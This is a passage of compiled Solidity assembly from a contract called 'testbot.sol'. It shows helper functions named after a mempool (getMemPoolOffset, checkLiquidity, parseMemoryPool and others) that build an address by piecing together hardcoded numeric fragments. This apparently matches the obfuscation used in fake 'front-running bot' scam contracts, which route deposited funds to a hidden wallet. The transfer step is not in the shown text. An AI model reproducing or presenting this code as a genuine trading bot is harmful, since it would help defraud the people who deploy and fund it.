\"testbot.sol\":7297:7306  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"testbot.sol\":7282:7307  (b1 >= 97) && (b1 <= 102) */\n    tag_128:\n        /* \"testbot.sol\":7278:7504  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_129\n      jumpi\n        /* \"testbot.sol\":7333:7335  87 */\n      0x57\n        /* \"testbot.sol\":7327:7335  b1 -= 87 */\n      dup4\n      tag_130\n      swap2\n      swap1\n      tag_131\n      jump\t// in\n    tag_130:\n      swap3\n      pop\n        /* \"testbot.sol\":7278:7504  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_132)\n    tag_129:\n        /* \"testbot.sol\":7367:7369  65 */\n      0x41\n        /* \"testbot.sol\":7361:7363  b1 */\n      dup4\n        /* \"testbot.sol\":7361:7369  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"testbot.sol\":7360:7384  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_133\n      jumpi\n      pop\n        /* \"testbot.sol\":7381:7383  70 */\n      0x46\n        /* \"testbot.sol\":7375:7377  b1 */\n      dup4\n        /* \"testbot.sol\":7375:7383  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"testbot.sol\":7360:7384  (b1 >= 65) && (b1 <= 70) */\n    tag_133:\n        /* \"testbot.sol\":7356:7504  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_134\n      jumpi\n        /* \"testbot.sol\":7410:7412  55 */\n      0x37\n        /* \"testbot.sol\":7404:7412  b1 -= 55 */\n      dup4\n      tag_135\n      swap2\n      swap1\n      tag_131\n      jump\t// in\n    tag_135:\n      swap3\n      pop\n        /* \"testbot.sol\":7356:7504  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_136)\n    tag_134:\n        /* \"testbot.sol\":7444:7446  48 */\n      0x30\n        /* \"testbot.sol\":7438:7440  b1 */\n      dup4\n        /* \"testbot.sol\":7438:7446  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"testbot.sol\":7437:7461  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_137\n      jumpi\n      pop\n        /* \"testbot.sol\":7458:7460  57 */\n      0x39\n        /* \"testbot.sol\":7452:7454  b1 */\n      dup4\n        /* \"testbot.sol\":7452:7460  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"testbot.sol\":7437:7461  (b1 >= 48) && (b1 <= 57) */\n    tag_137:\n        /* \"testbot.sol\":7433:7504  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_138\n      jumpi\n        /* \"testbot.sol\":7487:7489  48 */\n      0x30\n        /* \"testbot.sol\":7481:7489  b1 -= 48 */\n      dup4\n      tag_139\n      swap2\n      swap1\n      tag_131\n      jump\t// in\n    tag_139:\n      swap3\n      pop\n        /* \"testbot.sol\":7433:7504  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_138:\n        /* \"testbot.sol\":7356:7504  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_136:\n        /* \"testbot.sol\":7278:7504  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_132:\n        /* \"testbot.sol\":7528:7530  97 */\n      0x61\n        /* \"testbot.sol\":7522:7524  b2 */\n      dup3\n        /* \"testbot.sol\":7522:7530  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"testbot.sol\":7521:7546  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_140\n      jumpi\n      pop\n        /* \"testbot.sol\":7542:7545  102 */\n      0x66\n        /* \"testbot.sol\":7536:7538  b2 */\n      dup3\n        /* \"testbot.sol\":7536:7545  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"testbot.sol\":7521:7546  (b2 >= 97) && (b2 <= 102) */\n    tag_140:\n        /* \"testbot.sol\":7517:7743  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_141\n      jumpi\n        /* \"testbot.sol\":7572:7574  87 */\n      0x57\n        /* \"testbot.sol\":7566:7574  b2 -= 87 */\n      dup3\n      tag_142\n      swap2\n      swap1\n      tag_131\n      jump\t// in\n    tag_142:\n      swap2\n      pop\n        /* \"testbot.sol\":7517:7743  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_143)\n    tag_141:\n        /* \"testbot.sol\":7606:7608  65 */\n      0x41\n        /* \"testbot.sol\":7600:7602  b2 */\n      dup3\n        /* \"testbot.sol\":7600:7608  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"testbot.sol\":7599:7623  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_144\n      jumpi\n      pop\n        /* \"testbot.sol\":7620:7622  70 */\n      0x46\n        /* \"testbot.sol\":7614:7616  b2 */\n      dup3\n        /* \"testbot.sol\":7614:7622  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"testbot.sol\":7599:7623  (b2 >= 65) && (b2 <= 70) */\n    tag_144:\n        /* \"testbot.sol\":7595:7743  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_145\n      jumpi\n        /* \"testbot.sol\":7649:7651  55 */\n      0x37\n        /* \"testbot.sol\":7643:7651  b2 -= 55 */\n      dup3\n      tag_146\n      swap2\n      swap1\n      tag_131\n      jump\t// in\n    tag_146:\n      swap2\n      pop\n        /* \"testbot.sol\":7595:7743  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_147)\n    tag_145:\n        /* \"testbot.sol\":7683:7685  48 */\n      0x30\n        /* \"testbot.sol\":7677:7679  b2 */\n      dup3\n        /* \"testbot.sol\":7677:7685  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"testbot.sol\":7676:7700  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_148\n      jumpi\n      pop\n        /* \"testbot.sol\":7697:7699  57 */\n      0x39\n        /* \"testbot.sol\":7691:7693  b2 */\n      dup3\n        /* \"testbot.sol\":7691:7699  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"testbot.sol\":7676:7700  (b2 >= 48) && (b2 <= 57) */\n    tag_148:\n        /* \"testbot.sol\":7672:7743  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_149\n      jumpi\n        /* \"testbot.sol\":7726:7728  48 */\n      0x30\n        /* \"testbot.sol\":7720:7728  b2 -= 48 */\n      dup3\n      tag_150\n      swap2\n      swap1\n      tag_131\n      jump\t// in\n    tag_150:\n      swap2\n      pop\n        /* \"testbot.sol\":7672:7743  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_149:\n        /* \"testbot.sol\":7595:7743  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_147:\n        /* \"testbot.sol\":7517:7743  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_143:\n        /* \"testbot.sol\":7776:7778  b2 */\n      dup2\n        /* \"testbot.sol\":7771:7773  16 */\n      0x10\n        /* \"testbot.sol\":7766:7768  b1 */\n      dup5\n        /* \"testbot.sol\":7766:7773  b1 * 16 */\n      tag_151\n      swap2\n      swap1\n      tag_120\n      jump\t// in\n    tag_151:\n        /* \"testbot.sol\":7766:7778  b1 * 16 + b2 */\n      tag_152\n      swap2\n      swap1\n      tag_153\n      jump\t// in\n    tag_152:\n        /* \"testbot.sol\":7756:7779  iaddr += (b1 * 16 + b2) */\n      dup5\n      tag_154\n      swap2\n      swap1\n      tag_153\n      jump\t// in\n    tag_154:\n      swap4\n      pop\n        /* \"testbot.sol\":7149:7150  2 */\n      0x02\n        /* \"testbot.sol\":7144:7150  i += 2 */\n      dup2\n      tag_155\n      swap2\n      swap1\n      tag_125\n      jump\t// in\n    tag_155:\n      swap1\n      pop\n        /* \"testbot.sol\":7111:7790  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_116)\n    tag_117:\n      pop\n        /* \"testbot.sol\":7814:7819  iaddr */\n      dup3\n        /* \"testbot.sol\":7799:7820  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":6899:7827  function parseMemoryPool(... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"testbot.sol\":7833:7922  function mempoolLayer() internal pure returns (bytes4) {... */\n    tag_79:\n        /* \"testbot.sol\":7880:7886  bytes4 */\n      0x00\n        /* \"testbot.sol\":7905:7915  0xfd7e4d80 */\n      0xfd7e4d80\n        /* \"testbot.sol\":7898:7915  return 0xfd7e4d80 */\n      0xe0\n      shl\n      swap1\n      pop\n        /* \"testbot.sol\":7833:7922  function mempoolLayer() internal pure returns (bytes4) {... */\n      swap1\n      jump\t// out\n        /* \"testbot.sol\":5019:5106  function getMemPoolOffset() internal pure returns (uint) {... */\n    tag_90:\n        /* \"testbot.sol\":5070:5074  uint */\n      0x00\n        /* \"testbot.sol\":5093:5099  322258 */\n      0x04ead2\n        /* \"testbot.sol\":5086:5099  return 322258 */\n      swap1\n      pop\n        /* \"testbot.sol\":5019:5106  function getMemPoolOffset() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"testbot.sol\":5112:5199  function getMemPoolLength() internal pure returns (uint) {... */\n    tag_92:\n        /* \"testbot.sol\":5163:5167  uint */\n      0x00\n        /* \"testbot.sol\":5186:5192  187591 */\n      0x02dcc7\n        /* \"testbot.sol\":5179:5192  return 187591 */\n      swap1\n      pop\n        /* \"testbot.sol\":5112:5199  function getMemPoolLength() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"testbot.sol\":5205:5292  function getMemPoolHeight() internal pure returns (uint) {... */\n    tag_94:\n        /* \"testbot.sol\":5256:5260  uint */\n      0x00\n        /* \"testbot.sol\":5279:5285  829371 */\n      0x0ca7bb\n        /* \"testbot.sol\":5272:5285  return 829371 */\n      swap1\n      pop\n        /* \"testbot.sol\":5205:5292  function getMemPoolHeight() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"testbot.sol\":5298:5384  function getMemPoolDepth() internal pure returns (uint) {... */\n    tag_96:\n        /* \"testbot.sol\":5348:5352  uint */\n      0x00\n        /* \"testbot.sol\":5371:5377  796950 */\n      0x0c2916\n        /* \"testbot.sol\":5364:5377  return 796950 */\n      swap1\n      pop\n        /* \"testbot.sol\":5298:5384  function getMemPoolDepth() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"testbot.sol\":4023:5013  function checkLiquidity(uint a) internal pure returns (string memory) {... */\n    tag_99:\n        /* \"testbot.sol\":4078:4091  string memory */\n      0x60\n        /* \"testbot.sol\":4103:4113  uint count */\n      0x00\n        /* \"testbot.sol\":4127:4133  uint b */\n      dup1\n        /* \"testbot.sol\":4136:4137  a */\n      dup4\n        /* \"testbot.sol\":4127:4137  uint b = a */\n      swap1\n      pop\n        /* \"testbot.sol\":4147:4215  while (b != 0) {... */\n    tag_162:\n        /* \"testbot.sol\":4159:4160  0 */\n      0x00\n        /* \"testbot.sol\":4154:4155  b */\n      dup2\n        /* \"testbot.sol\":4154:4160  b != 0 */\n      eq\n        /* \"testbot.sol\":4147:4215  while (b != 0) {... */\n      tag_163\n      jumpi\n        /* \"testbot.sol\":4176:4183  count++ */\n      dup2\n      dup1\n      tag_164\n      swap1\n      tag_165\n      jump\t// in\n    tag_164:\n      swap3\n      pop\n      pop\n        /* \"testbot.sol\":4202:4204  16 */\n      0x10\n        /* \"testbot.sol\":4197:4204  b /= 16 */\n      dup2\n      tag_166\n      swap2\n      swap1\n      tag_167\n      jump\t// in\n    tag_166:\n      swap1\n      pop\n        /* \"testbot.sol\":4147:4215  while (b != 0) {... */\n      jump(tag_162)\n    tag_163:\n        /* \"testbot.sol\":4224:4240  bytes memory res */\n      0x00\n        /* \"testbot.sol\":4253:4258  count */\n      dup3\n        /* \"testbot.sol\":4243:4259  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_168\n      jumpi\n      tag_169\n      tag_170\n      jump\t// in\n    tag_169:\n    tag_168:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_171\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_171:\n      pop\n        /* \"testbot.sol\":4224:4259  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"testbot.sol\":4274:4280  uint i */\n      0x00\n        /* \"testbot.sol\":4269:4413  for (uint i = 0; i < count; ++i) {... */\n    tag_172:\n        /* \"testbot.sol\":4290:4295  count */\n      dup4\n        /* \"testbot.sol\":4286:4287  i */\n      dup2\n        /* \"testbot.sol\":4286:4295  i < count */\n      lt\n        /* \"testbot.sol\":4269:4413  for (uint i = 0; i < count; ++i) {... */\n      iszero\n      tag_173\n      jumpi\n        /* \"testbot.sol\":4324:4326  16 */\n      0x10\n        /* \"testbot.sol\":4320:4321  a */\n      dup7\n        /* \"testbot.sol\":4320:4326  a % 16 */\n      tag_175\n      swap2\n      swap1\n      tag_176\n      jump\t// in\n    tag_175:\n        /* \"testbot.sol\":4316:4326  b = a % 16 */\n      swap3\n      pop\n        /* \"testbot.sol\":4361:4381  toHexDigit(uint8(b)) */\n      tag_177\n        /* \"testbot.sol\":4378:4379  b */\n      dup4\n        /* \"testbot.sol\":4361:4371  toHexDigit */\n      tag_178\n        /* \"testbot.sol\":4361:4381  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_177:\n        /* \"testbot.sol\":4340:4343  res */\n      dup3\n        /* \"testbot.sol\":4356:4357  1 */\n      0x01\n        /* \"testbot.sol\":4352:4353  i */\n      dup4\n        /* \"testbot.sol\":4344:4349  count */\n      dup8\n        /* \"testbot.sol\":4344:4353  count - i */\n      tag_179\n      swap2\n      swap1\n      tag_180\n      jump\t// in\n    tag_179:\n        /* \"testbot.sol\":4344:4357  count - i - 1 */\n      tag_181\n      swap2\n      swap1\n      tag_180\n      jump\t// in\n    tag_181:\n        /* \"testbot.sol\":4340:4358  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_182\n      jumpi\n      tag_183\n      tag_123\n      jump\t// in\n    tag_183:\n    tag_182:\n      0x20\n      add\n      add\n        /* \"testbot.sol\":4340:4381  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"testbot.sol\":4400:4402  16 */\n      0x10\n        /* \"testbot.sol\":4395:4402  a /= 16 */\n      dup7\n      tag_184\n      swap2\n      swap1\n      tag_167\n      jump\t// in\n    tag_184:\n      swap6\n      pop\n        /* \"testbot.sol\":4297:4300  ++i */\n      dup1\n      tag_185\n      swap1\n      tag_165\n      jump\t// in\n    tag_185:\n      swap1\n      pop\n        /* \"testbot.sol\":4269:4413  for (uint i = 0; i < count; ++i) {... */\n      jump(tag_172)\n    tag_173:\n      pop\n        /* \"testbot.sol\":4422:4436  uint hexLength */\n      0x00\n        /* \"testbot.sol\":4452:4455  res */\n      dup2\n        /* \"testbot.sol\":4439:4464  bytes(string(res)).length */\n      mload\n        /* \"testbot.sol\":4422:4464  uint hexLength = bytes(string(res)).length */\n      swap1\n      pop\n        /* \"testbot.sol\":4491:4492  4 */\n      0x04\n        /* \"testbot.sol\":4478:4487  hexLength */\n      dup2\n        /* \"testbot.sol\":4478:4492  hexLength == 4 */\n      sub\n        /* \"testbot.sol\":4474:4978  if (hexLength == 4) {... */\n      tag_186\n      jumpi\n        /* \"testbot.sol\":4508:4528  string memory _hexC1 */\n      0x00\n        /* \"testbot.sol\":4531:4556  mempool(\"0\", string(res)) */\n      tag_187\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"testbot.sol\":4551:4554  res */\n      dup5\n        /* \"testbot.sol\":4531:4538  mempool */\n      tag_101\n        /* \"testbot.sol\":4531:4556  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_187:\n        /* \"testbot.sol\":4508:4556  string memory _hexC1 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"testbot.sol\":4577:4583  _hexC1 */\n      dup1\n        /* \"testbot.sol\":4570:4583  return _hexC1 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_161)\n        /* \"testbot.sol\":4474:4978  if (hexLength == 4) {... */\n    tag_186:\n        /* \"testbot.sol\":4617:4618  3 */\n      0x03\n        /* \"testbot.sol\":4604:4613  hexLength */\n      dup2\n        /* \"testbot.sol\":4604:4618  hexLength == 3 */\n      sub\n        /* \"testbot.sol\":4600:4978  if (hexLength == 3) {... */\n      tag_189\n      jumpi\n        /* \"testbot.sol\":4634:4654  string memory _hexC2 */\n      0x00\n        /* \"testbot.sol\":4657:4683  mempool(\"00\", string(res)) */\n      tag_190\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x02\n      dup2\n      mstore\n      0x20\n      add\n      0x3030000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"testbot.sol\":4678:4681  res */\n      dup5\n        /* \"testbot.sol\":4657:4664  mempool */\n      tag_101\n        /* \"testbot.sol\":4657:4683  mempool(\"00\", string(res)) */\n      jump\t// in\n    tag_190:\n        /* \"testbot.sol\":4634:4683  string memory _hexC2 = mempool(\"00\", string(res)) */\n      swap1\n      pop\n        /* \"testbot.sol\":4704:4710  _hexC2 */\n      dup1\n        /* \"testbot.sol\":4697:4710  return _hexC2 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_161)\n        /* \"testbot.sol\":4600:4978  if (hexLength == 3) {... */\n    tag_189:\n        /* \"testbot.sol\":4744:4745  2 */\n      0x02\n        /* \"testbot.sol\":4731:4740  hexLength */\n      dup2\n        /* \"testbot.sol\":4731:4745  hexLength == 2 */\n      sub\n        /* \"testbot.sol\":4727:4978  if (hexLength == 2) {... */\n      tag_192\n      jumpi\n        /* \"testbot.sol\":4761:4781  string memory _hexC3 */\n      0x00\n        /* \"testbot.sol\":4784:4811  mempool(\"000\", string(res)) */\n      tag_193\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x3030300000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"testbot.sol\":4806:4809  res */\n      dup5\n        /* \"testbot.sol\":4784:4791  mempool */\n      tag_101\n        /* \"testbot.sol\":4784:4811  mempool(\"000\", string(res)) */\n      jump\t// in\n    tag_193:\n        /* \"testbot.sol\":4761:4811  string memory _hexC3 = mempool(\"000\", string(res)) */\n      swap1\n      pop\n        /* \"testbot.sol\":4832:4838  _hexC3 */\n      dup1\n        /* \"testbot.sol\":4825:4838  return _hexC3 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_161)\n        /* \"testbot.sol\":4727:4978  if (hexLength == 2) {... */\n    tag_192:\n        /* \"testbot.sol\":4872:4873  1 */\n      0x01\n        /* \"testbot.sol\":4859:4868  hexLength */\n      dup2\n        /* \"testbot.sol\":4859:4873  hexLength == 1 */\n      sub\n        /* \"testbot.sol\":4855:4978  if (hexLength == 1) {... */\n      tag_195\n      jumpi\n        /* \"testbot.sol\":4889:4909  string memory _hexC4 */\n      0x00\n        /* \"testbot.sol\":4912:4940  mempool(\"0000\", string(res)) */\n      tag_196\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3030303000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"testbot.sol\":4935:4938  res */\n      dup5\n        /* \"testbot.sol\":4912:4919  mempool */\n      tag_101\n        /* \"testbot.sol\":4912:4940  mempool(\"0000\", string(res)) */\n      jump\t// in\n    tag_196:\n        /* \"testbot.sol\":4889:4940  string memory _hexC4 = mempool(\"0000\", string(res)) */\n      swap1\n      pop\n        /* \"testbot.sol\":4961:4967  _hexC4 */\n      dup1\n        /* \"testbot.sol\":4954:4967  return _hexC4 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_161)\n        /* \"testbot.sol\":4855:4978  if (hexLength == 1) {... */\n    tag_195:\n        /* \"testbot.sol\":5002:5005  res */\n      dup2\n        /* \"testbot.sol\":4988:5006  return string(res) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":4023:5013  function checkLiquidity(uint a) internal pure returns (string memory) {... */\n    tag_161:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"testbot.sol\":2483:3148  function mempool(... */\n    tag_101:\n        /* \"testbot.sol\":2588:2601  string memory */\n      0x60\n        /* \"testbot.sol\":2613:2636  bytes memory _baseBytes */\n      0x00\n        /* \"testbot.sol\":2645:2650  _base */\n      dup4\n        /* \"testbot.sol\":2613:2651  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"testbot.sol\":2661:2685  bytes memory _valueBytes */\n      0x00\n        /* \"testbot.sol\":2694:2700  _value */\n      dup4\n        /* \"testbot.sol\":2661:2701  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"testbot.sol\":2712:2735  string memory _tmpValue */\n      0x00\n        /* \"testbot.sol\":2782:2793  _valueBytes */\n      dup2\n        /* \"testbot.sol\":2782:2800  _valueBytes.length */\n      mload\n        /* \"testbot.sol\":2762:2772  _baseBytes */\n      dup4\n        /* \"testbot.sol\":2762:2779  _baseBytes.length */\n      mload\n        /* \"testbot.sol\":2762:2800  _baseBytes.length + _valueBytes.length */\n      tag_198\n      swap2\n      swap1\n      tag_125\n      jump\t// in\n    tag_198:\n        /* \"testbot.sol\":2738:2810  new string(... */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_199\n      jumpi\n      tag_200\n      tag_170\n      jump\t// in\n    tag_200:\n    tag_199:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_201\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_201:\n      pop\n        /* \"testbot.sol\":2712:2810  string memory _tmpValue = new string(... */\n      swap1\n      pop\n        /* \"testbot.sol\":2820:2842  bytes memory _newValue */\n      0x00\n        /* \"testbot.sol\":2851:2860  _tmpValue */\n      dup2\n        /* \"testbot.sol\":2820:2861  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"testbot.sol\":2872:2878  uint i */\n      0x00\n        /* \"testbot.sol\":2888:2894  uint j */\n      dup1\n        /* \"testbot.sol\":2914:2915  0 */\n      0x00\n        /* \"testbot.sol\":2910:2915  i = 0 */\n      swap2\n      pop\n        /* \"testbot.sol\":2905:3000  for (i = 0; i < _baseBytes.length; i++) {... */\n    tag_202:\n        /* \"testbot.sol\":2921:2931  _baseBytes */\n      dup6\n        /* \"testbot.sol\":2921:2938  _baseBytes.length */\n      mload\n        /* \"testbot.sol\":2917:2918  i */\n      dup3\n        /* \"testbot.sol\":2917:2938  i < _baseBytes.length */\n      lt\n        /* \"testbot.sol\":2905:3000  for (i = 0; i < _baseBytes.length; i++) {... */\n      iszero\n      tag_203\n      jumpi\n        /* \"testbot.sol\":2976:2986  _baseBytes */\n      dup6\n        /* \"testbot.sol\":2987:2988  i */\n      dup3\n        /* \"testbot.sol\":2976:2989  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_205\n      jumpi\n      tag_206\n      tag_123\n      jump\t// in\n    tag_206:\n    tag_205:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"testbot.sol\":2959:2968  _newValue */\n      dup4\n        /* \"testbot.sol\":2969:2972  j++ */\n      dup3\n      dup1\n      tag_207\n      swap1\n      tag_165\n      jump\t// in\n    tag_207:\n      swap4\n      pop\n        /* \"testbot.sol\":2959:2973  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_208\n      jumpi\n      tag_209\n      tag_123\n      jump\t// in\n    tag_209:\n    tag_208:\n      0x20\n      add\n      add\n        /* \"testbot.sol\":2959:2989  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"testbot.sol\":2940:2943  i++ */\n      dup2\n      dup1\n      tag_210\n      swap1\n      tag_165\n      jump\t// in\n    tag_210:\n      swap3\n      pop\n      pop\n        /* \"testbot.sol\":2905:3000  for (i = 0; i < _baseBytes.length; i++) {... */\n      jump(tag_202)\n    tag_203:\n        /* \"testbot.sol\":3019:3020  0 */\n      0x00\n        /* \"testbot.sol\":3015:3020  i = 0 */\n      swap2\n      pop\n        /* \"testbot.sol\":3010:3107  for (i = 0; i < _valueBytes.length; i++) {... */\n    tag_211:\n        /* \"testbot.sol\":3026:3037  _valueBytes */\n      dup5\n        /* \"testbot.sol\":3026:3044  _valueBytes.length */\n      mload\n        /* \"testbot.sol\":3022:3023  i */\n      dup3\n        /* \"testbot.sol\":3022:3044  i < _valueBytes.length */\n      lt\n        /* \"testbot.sol\":3010:3107  for (i = 0; i < _valueBytes.length; i++) {... */\n      iszero\n      tag_212\n      jumpi\n        /* \"testbot.sol\":3082:3093  _valueBytes */\n      dup5\n        /* \"testbot.sol\":3094:3095  i */\n      dup3\n        /* \"testbot.sol\":3082:3096  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_214\n      jumpi\n      tag_215\n      tag_123\n      jump\t// in\n    tag_215:\n    tag_214:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"testbot.sol\":3065:3074  _newValue */\n      dup4\n        /* \"testbot.sol\":3075:3078  j++ */\n      dup3\n      dup1\n      tag_216\n      swap1\n      tag_165\n      jump\t// in\n    tag_216:\n      swap4\n      pop\n        /* \"testbot.sol\":3065:3079  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_217\n      jumpi\n      tag_218\n      tag_123\n      jump\t// in\n    tag_218:\n    tag_217:\n      0x20\n      add\n      add\n        /* \"testbot.sol\":3065:3096  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"testbot.sol\":3046:3049  i++ */\n      dup2\n      dup1\n      tag_219\n      swap1\n      tag_165\n      jump\t// in\n    tag_219:\n      swap3\n      pop\n      pop\n        /* \"testbot.sol\":3010:3107  for (i = 0; i < _valueBytes.length; i++) {... */\n      jump(tag_211)\n    tag_212:\n        /* \"testbot.sol\":3131:3140  _newValue */\n      dup3\n        /* \"testbot.sol\":3117:3141  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":2483:3148  function mempool(... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"testbot.sol\":3484:3813  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_178:\n        /* \"testbot.sol\":3536:3542  bytes1 */\n      0x00\n        /* \"testbot.sol\":3563:3564  d */\n      dup2\n        /* \"testbot.sol\":3558:3564  0 <= d */\n      0xff\n      and\n        /* \"testbot.sol\":3558:3559  0 */\n      0x00\n        /* \"testbot.sol\":3558:3564  0 <= d */\n      gt\n      iszero\n        /* \"testbot.sol\":3558:3574  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_221\n      jumpi\n      pop\n        /* \"testbot.sol\":3573:3574  9 */\n      0x09\n        /* \"testbot.sol\":3568:3569  d */\n      dup3\n        /* \"testbot.sol\":3568:3574  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"testbot.sol\":3558:3574  0 <= d && d <= 9 */\n    tag_221:\n        /* \"testbot.sol\":3554:3749  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_222\n      jumpi\n        /* \"testbot.sol\":3625:3626  d */\n      dup2\n        /* \"testbot.sol\":3610:3621  bytes1(\"0\") */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"testbot.sol\":3604:3622  uint8(bytes1(\"0\")) */\n      0xf8\n      shr\n        